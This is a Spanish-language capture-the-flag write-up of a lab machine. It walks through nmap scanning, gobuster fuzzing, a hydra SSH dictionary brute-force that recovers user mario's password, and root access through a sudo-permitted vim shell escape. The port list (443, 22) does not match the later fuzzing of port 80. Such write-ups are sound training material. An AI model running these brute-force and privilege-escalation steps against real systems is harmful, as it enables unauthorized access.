# Nmap & Fuzzing

## Reconocimiento con Nmap
Comenzamos con el escaneo con **Nmap** para identificar los puertos abiertos en la máquina objetivo.

```sh
nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn <IP>
```
![image](https://github.com/ErickAnchundia/Machines-Write-Ups/blob/main/images/Pasted%20image%2020250420150515.png)
<br>


Se identifican **2 puertos abiertos**:
- **HTTPS** (`443`)
- **SSH** (`22`)

## Fuzzing en el puerto 80
Utilizamos **Gobuster** para realizar un fuzzing en el puerto `80` y descubrir rutas ocultas.

```sh
gobuster dir -w /home/kali/WordLists/directory-medium -u http://<IP> -x txt,sql,py,js,php,html
```

![image](https://github.com/ErickAnchundia/Machines-Write-Ups/blob/main/images/Pasted%20image%2020250420150909.png)
<br>
Entre los resultados, encontramos un mensaje dirigido a un usuario llamado **Mario**.

![image](https://github.com/ErickAnchundia/Machines-Write-Ups/blob/main/images/Pasted%20image%2020250420151003.png)
<br>
## Ataque de fuerza bruta por SSH
Probamos un ataque de **fuerza bruta con diccionario** contra el usuario descubierto.

```sh
hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://<IP>
```

![image](https://github.com/ErickAnchundia/Machines-Write-Ups/blob/main/images/Pasted%20image%2020250420151934.png)
<br>
Ejecutando el ataque, encontramos que la contraseña es **chocolate**.

## Acceso por SSH y escalada de privilegios
Ingresamos vía **SSH** con las credenciales obtenidas.

```sh
ssh mario@<IP>
```

Una vez dentro, verificamos los permisos con:

```sh
sudo -l
```

Descubrimos que tenemos acceso a ejecutar **vim** con privilegios elevados.

![image](https://github.com/ErickAnchundia/Machines-Write-Ups/blob/main/images/Pasted%20image%2020250420152338.png)
<br>
Aprovechamos **Vim** para abrir una terminal:

```sh
:!bash
```

Desde aquí solicitamos a **vim** que abra otra sesión con privilegios de **root**.

![image](https://github.com/ErickAnchundia/Machines-Write-Ups/blob/main/images/Pasted%20image%2020250420152811.png)
<br>
Y con esto, **ya somos root**.

![image](https://github.com/ErickAnchundia/Machines-Write-Ups/blob/main/images/Pasted%20image%2020250420152835.png)
<br>
